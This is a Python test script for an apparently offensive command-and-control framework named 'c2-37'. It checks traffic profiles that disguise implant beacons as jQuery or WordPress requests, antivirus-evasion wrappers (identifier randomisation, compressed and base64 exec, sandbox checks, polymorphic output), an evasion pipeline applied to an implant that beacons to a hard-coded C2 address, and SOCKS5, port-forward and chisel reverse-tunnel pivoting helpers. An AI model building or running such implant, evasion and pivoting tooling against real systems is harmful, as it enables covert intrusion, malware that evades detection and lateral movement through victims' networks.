"""Test c2-37 v3 modules: profiles, evasion, pivot."""
import sys, time, socket

print("=" * 60)
print("  c2-37 v3 — Profiles, Evasion, Pivot Tests")
print("=" * 60)

# ── Test Profiles ──
print("\n[1] C2 Traffic Profiles...")
from c2_37.profiles import get_profile, list_profiles, PROFILES

profiles = list_profiles()
print(f"    [+] {len(profiles)} profiles: {[p['name'] for p in profiles]}")

jquery = get_profile("jquery")
assert jquery.register_uri == "/jquery-3.7.1.min.js"
headers = jquery.get_headers()
assert "jQuery" not in headers.get("User-Agent", "")  # Should look like Chrome
assert headers.get("Referer") == "https://code.jquery.com/"
print(f"    [+] jQuery profile: UA={headers['User-Agent'][:40]}...")

url = jquery.shape_url("http://10.10.10.10:8037", jquery.beacon_uri)
assert "jquery-3.7.1.slim" in url
assert "?" in url  # junk params
print(f"    [+] Shaped URL: {url}")

# Test response wrapping
data = b'{"commands":[]}'
wrapped = jquery.wrap_response(data)
assert b"jQuery v3.7.1" in wrapped
assert b"sourceMappingURL" in wrapped
unwrapped = jquery.unwrap_response(wrapped)
assert unwrapped == data
print("    [+] Response wrap/unwrap OK")

wp = get_profile("wordpress")
assert "admin-ajax" in wp.beacon_uri
print(f"    [+] WordPress profile: beacon={wp.beacon_uri}")

# ── Test Evasion ──
print("\n[2] AV Evasion Techniques...")
from c2_37.evasion import (
    randomize_names, compress_and_exec, base64_exec,
    add_sandbox_checks, polymorphic_wrapper, apply_evasion
)

test_code = '''
class Implant:
    def register(self):
        pass
    def beacon(self):
        pass
    def execute(self, cmd):
        pass
agent = Implant()
agent.register()
'''

# Randomize names
randomized = randomize_names(test_code)
assert "Implant" not in randomized
assert "register" not in randomized
assert "beacon" not in randomized
print("    [+] Name randomization OK")

# Compress
compressed = compress_and_exec("print('hello c2-37')")
assert "zlib.decompress" in compressed
exec(compressed)  # Should print "hello c2-37"
print("    [+] Compression wrapper OK")

# Base64
b64 = base64_exec("x=42")
assert "b64decode" in b64
exec(b64)
print("    [+] Base64 wrapper OK")

# Sandbox checks
sandboxed = add_sandbox_checks("print('safe')")
assert "cpu_count" in sandboxed
assert "MemTotal" in sandboxed
print("    [+] Sandbox checks generated OK")

# Polymorphic
p1 = polymorphic_wrapper("pass")
p2 = polymorphic_wrapper("pass")
assert p1 != p2  # Should be different each time
print("    [+] Polymorphic wrapper OK (unique each gen)")

# Full pipeline
from c2_37 import payloads
implant_code = payloads.python_implant("http://10.10.10.10:8037")
evaded = apply_evasion(implant_code, ["randomize", "poly", "compress"])
assert "Implant" not in evaded
assert "zlib" in evaded
print(f"    [+] Full evasion pipeline: {len(implant_code)} -> {len(evaded)} bytes")

# ── Test Pivot ──
print("\n[3] Pivot/Proxy Modules...")
from c2_37.pivot import PortForward, Socks5Proxy, chisel_server

# Port forward
pf = PortForward(19999, "127.0.0.1", 80)
assert pf.to_json()["type"] == "port_forward"
print("    [+] PortForward created OK")

# SOCKS5 proxy
socks = Socks5Proxy(port=19998)
socks.start(background=True)
time.sleep(0.3)
assert socks._running
# Quick connect test
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 19998))
    s.sendall(b"\x05\x01\x00")  # SOCKS5 greeting
    resp = s.recv(2)
    assert resp == b"\x05\x00", f"Unexpected SOCKS response: {resp}"
    s.close()
    print("    [+] SOCKS5 proxy: handshake OK")
except Exception as e:
    print(f"    [-] SOCKS5 test: {e}")
socks.stop()
print("    [+] SOCKS5 proxy stopped OK")

# Chisel helper
ch = chisel_server(9999)
assert "chisel server" in ch["server_cmd"]
assert "R:socks" in ch["client_cmd"]
print(f"    [+] Chisel helper: {ch['server_cmd']}")

print("\n" + "=" * 60)
print("  ALL v3 TESTS PASSED")
print("=" * 60)
